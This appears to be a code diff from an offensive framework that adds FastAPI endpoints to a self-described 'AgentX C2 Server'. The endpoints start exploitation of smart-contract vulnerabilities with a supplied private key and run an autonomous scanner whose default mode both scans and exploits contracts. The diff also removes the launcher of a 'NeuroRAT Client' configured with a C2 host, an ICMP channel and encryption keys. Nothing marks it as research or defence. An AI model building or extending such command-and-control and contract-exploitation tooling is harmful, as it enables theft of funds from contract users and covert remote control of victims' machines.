+        vulnerability_type = config.get("vulnerability_type")
+        private_key = config.get("private_key")
+        exploit_params = config.get("params", {})
+        
+        if not contract_address:
+            raise ValueError("Contract address is required")
+        
+        if not vulnerability_type:
+            raise ValueError("Vulnerability type is required")
+        
+        if not private_key:
+            raise ValueError("Private key is required")
+        
+        result = web3_contract_analyzer.exploit_vulnerability(
+            chain=chain,
+            network=network,
+            contract_address=contract_address,
+            private_key=private_key,
+            vulnerability_type=vulnerability_type,
+            exploit_params=exploit_params
+        )
+        
+        contract_operations[operation_id]["status"] = "completed"
+        contract_operations[operation_id]["end_time"] = datetime.now().isoformat()
+        contract_operations[operation_id]["results"] = result
+        
+    except Exception as e:
+        logger.error(f"Contract exploitation failed: {str(e)}")
+        contract_operations[operation_id]["status"] = "failed"
+        contract_operations[operation_id]["error"] = str(e)
+        contract_operations[operation_id]["end_time"] = datetime.now().isoformat()
+
+@app.post("/api/contracts/scanner/start")
+async def start_contract_scanner(scanner_config: Dict[str, Any]):
+    """Запускает автономный сканер смарт-контрактов"""
+    operation_id = str(uuid.uuid4())
+    
+    contract_operations[operation_id] = {
+        "id": operation_id,
+        "type": "contract_scanner",
+        "status": "starting",
+        "start_time": datetime.now().isoformat(),
+        "details": scanner_config
+    }
+    
+    # Запуск сканера в отдельном потоке
+    asyncio.create_task(run_contract_scanner(operation_id, scanner_config))
+    
+    return {"operation_id": operation_id, "status": "starting"}
+
+async def run_contract_scanner(operation_id, config):
+    try:
+        # Конфигурация сканера
+        config_file = config.get("config_file")
+        mode = config.get("mode", "both")  # scan, exploit, both
+        
+        # Создаем экземпляр сканера
+        scanner = AutonomousContractScanner(config_file=config_file)
+        
+        # Настраиваем режим работы
+        if mode == "scan":
+            scanner.config["exploit_enabled"] = False
+        
+        # Запускаем сканер
+        scanner.start()
+        
+        contract_operations[operation_id]["status"] = "running"
+        contract_operations[operation_id]["scanner_instance"] = scanner
+        
+        # Обновляем статистику каждые 5 минут
+        while True:
+            await asyncio.sleep(300)  # 5 минут
+            stats = scanner.get_stats()
+            contract_operations[operation_id]["stats"] = stats
+            
+    except Exception as e:
+        logger.error(f"Contract scanner failed: {str(e)}")
+        contract_operations[operation_id]["status"] = "failed"
+        contract_operations[operation_id]["error"] = str(e)
+        contract_operations[operation_id]["end_time"] = datetime.now().isoformat()
+
+@app.post("/api/contracts/scanner/stop")
+async def stop_contract_scanner(data: Dict[str, Any]):
+    """Останавливает автономный сканер смарт-контрактов"""
+    operation_id = data.get("operation_id")
+    
+    if not operation_id or operation_id not in contract_operations:
+        raise HTTPException(status_code=404, detail="Scanner operation not found")
+    
+    operation = contract_operations[operation_id]
+    
+    if operation["type"] != "contract_scanner":
+        raise HTTPException(status_code=400, detail="Not a contract scanner operation")
+    
+    scanner = operation.get("scanner_instance")
+    if not scanner:
+        raise HTTPException(status_code=400, detail="Scanner instance not found")
+    
+    try:
+        scanner.stop()
+        operation["status"] = "stopped"
+        operation["end_time"] = datetime.now().isoformat()
+        
+        # Получаем финальную статистику
+        stats = scanner.get_stats()
+        operation["stats"] = stats
+        
+        return {"status": "stopped", "stats": stats}
+    except Exception as e:
+        logger.error(f"Failed to stop contract scanner: {str(e)}")
+        raise HTTPException(status_code=500, detail=f"Failed to stop scanner: {str(e)}")
+
+@app.get("/api/contracts/scanner/stats/{operation_id}")
+async def get_contract_scanner_stats(operation_id: str):
+    """Получает статистику работы автономного сканера смарт-контрактов"""
+    if operation_id not in contract_operations:
+        raise HTTPException(status_code=404, detail="Scanner operation not found")
+    
+    operation = contract_operations[operation_id]
+    
+    if operation["type"] != "contract_scanner":
+        raise HTTPException(status_code=400, detail="Not a contract scanner operation")
+    
+    scanner = operation.get("scanner_instance")
+    if not scanner:
+        return {
+            "stats": operation.get("stats", {}),
+            "status": operation["status"]
+        }
+    
+    try:
+        stats = scanner.get_stats()
+        operation["stats"] = stats
+        
+        return {
+            "stats": stats,
+            "status": operation["status"]
+        }
+    except Exception as e:
+        logger.error(f"Failed to get scanner stats: {str(e)}")
+        raise HTTPException(status_code=500, detail=f"Failed to get stats: {str(e)}")
+
+@app.get("/api/contracts/scanner/vulnerabilities/{operation_id}")
+async def get_contract_scanner_vulnerabilities(operation_id: str):
+    """Получает список найденных уязвимостей в смарт-контрактах"""
+    if operation_id not in contract_operations:
+        raise HTTPException(status_code=404, detail="Scanner operation not found")
+    
+    operation = contract_operations[operation_id]
+    
+    if operation["type"] != "contract_scanner":
+        raise HTTPException(status_code=400, detail="Not a contract scanner operation")
+    
+    scanner = operation.get("scanner_instance")
+    if not scanner:
+        return {"vulnerabilities": []}
+    
+    try:
+        vulnerable_contracts = scanner.get_vulnerable_contracts()
+        
+        return {
+            "vulnerabilities": vulnerable_contracts,
+            "count": len(vulnerable_contracts)
+        }
+    except Exception as e:
+        logger.error(f"Failed to get vulnerabilities: {str(e)}")
+        raise HTTPException(status_code=500, detail=f"Failed to get vulnerabilities: {str(e)}")
+
+@app.get("/api/operations")
+async def get_operations():
+    """Получает список всех операций"""
+    all_operations = {
+        **operations,
+        **crypto_operations,
+        **contract_operations
+    }
+    
+    # Преобразуем в список и сортируем по времени начала (от новых к старым)
+    operations_list = list(all_operations.values())
+    operations_list.sort(key=lambda x: x.get("start_time", ""), reverse=True)
+    
+    return {"operations": operations_list}
+
+@app.get("/api/operations/{operation_id}")
+async def get_operation(operation_id: str):
+    """Получает информацию о конкретной операции"""
+    all_operations = {
+        **operations,
+        **crypto_operations,
+        **contract_operations
+    }
+    
+    if operation_id not in all_operations:
+        raise HTTPException(status_code=404, detail="Operation not found")
+    
+    return all_operations[operation_id]
+
+@app.post("/api/scanner/monitor/start")
+async def start_block_monitor(config: Dict[str, Any]):
+    """Starts the block monitoring producer for a specific chain."""
+    chain = config.get("chain")
+    network = config.get("network")
+    rpc_url = config.get("rpc_url")
+    start_block = config.get("start_block", "latest")
+    poll_interval = config.get("poll_interval", 15)
+    
+    if not all([chain, network, rpc_url]):
+        raise HTTPException(status_code=400, detail="Missing required parameters: chain, network, rpc_url")
+        
+    monitor_id = f"{chain}:{network}"
+    if monitor_id in block_monitoring_tasks and not block_monitoring_tasks[monitor_id].done():
+        raise HTTPException(status_code=400, detail=f"Monitor for {monitor_id} is already running.")
+        
+    # Create and store the asyncio task
+    task = asyncio.create_task(
+        _monitor_blocks_producer(chain, network, rpc_url, start_block, poll_interval)
+    )
+    block_monitoring_tasks[monitor_id] = task
+    
+    logger.info(f"Started block monitor task for {monitor_id}")
+    return {"status": "success", "message": f"Block monitor started for {monitor_id}"}
+
+@app.post("/api/scanner/monitor/stop")
+async def stop_block_monitor(config: Dict[str, Any]):
+    """Stops the block monitoring producer for a specific chain."""
+    chain = config.get("chain")
+    network = config.get("network")
+    
+    if not all([chain, network]):
+        raise HTTPException(status_code=400, detail="Missing required parameters: chain, network")
+        
+    monitor_id = f"{chain}:{network}"
+    task = block_monitoring_tasks.get(monitor_id)
+    
+    if not task or task.done():
+        raise HTTPException(status_code=404, detail=f"Monitor for {monitor_id} not found or not running.")
+        
+    task.cancel()
+    try:
+        await task # Wait for the task to acknowledge cancellation
+    except asyncio.CancelledError:
+        logger.info(f"Block monitor task {monitor_id} successfully cancelled.")
+        
+    del block_monitoring_tasks[monitor_id]
+    
+    return {"status": "success", "message": f"Block monitor stopped for {monitor_id}"}
+
+@app.get("/api/scanner/monitor/status")
+async def get_monitor_status():
+    """Returns the status of active block monitoring producers."""
+    active_monitors = []
+    for monitor_id, task in block_monitoring_tasks.items():
+        if not task.done():
+            active_monitors.append(monitor_id)
+            
+    return {"active_monitors": active_monitors, "count": len(active_monitors)}
+
+# Ensure graceful shutdown of monitors on C2 server exit (optional)
+@app.on_event("shutdown")
+async def shutdown_event():
+    logger.info("C2 Server shutting down. Cancelling active monitors...")
+    for monitor_id, task in list(block_monitoring_tasks.items()): # Iterate over a copy
+        if not task.done():
+            task.cancel()
+            try:
+                await task
+            except asyncio.CancelledError:
+                pass # Expected
+            logger.info(f"Cancelled monitor task {monitor_id}")
+    logger.info("All active monitors cancelled.")
 
 def main():
-    """Основная функция для запуска клиента"""
-    # Разбор аргументов командной строки
-    parser = argparse.ArgumentParser(description="NeuroRAT Client")
-    parser.add_argument("-c", "--config", help="Путь к конфигурационному файлу")
-    parser.add_argument("--log-level", default="INFO", help="Уровень логирования")
-    parser.add_argument("--log-file", help="Файл для записи логов")
-    parser.add_argument("--c2-host", help="Хост C2-сервера")
-    parser.add_argument("--c2-ip", help="IP-адрес C2-сервера (для ICMP)")
-    parser.add_argument("--primary-channel", help="Основной канал связи")
-    parser.add_argument("--encryption-method", help="Метод шифрования")
-    parser.add_argument("--encryption-key", help="Ключ шифрования (base64)")
+    """Основная функция для запуска сервера"""
+    parser = argparse.ArgumentParser(description="AgentX C2 Server")
+    parser.add_argument("--host", default="0.0.0.0", help="Host to bind")
+    parser.add_argument("--port", type=int, default=8000, help="Port to bind")
     args = parser.parse_args()
     
-    # Настройка логирования
-    setup_logging(args.log_level, args.log_file)
+    logger.info(f"Starting AgentX C2 Server on {args.host}:{args.port}")
     
-    # Создаем и запускаем клиент
-    client = NeuroRATClient(
-        config_file=args.config,
-        c2_host=args.c2_host,
-        c2_ip=args.c2_ip,
-        primary_channel=args.primary_channel,
-        encryption_method=args.encryption_method,
-        encryption_key=args.encryption_key
-    )
-    
-    if client.start():
-        # В реальном коде здесь может быть логика для запуска в качестве сервиса
-        # или для выполнения в фоновом режиме
-        try:
-            # Простой способ - ждем завершения основного потока
-            while client.is_running and client.main_thread.is_alive():
-                time.sleep(1)
-        except KeyboardInterrupt:
-            # Обработка Ctrl+C
-            client.stop()
-    
-    return 0
-
+    uvicorn.run(app, host=args.host, port=args.port)
 
 if __name__ == "__main__":
-    sys.exit(main()) 
+    main() 
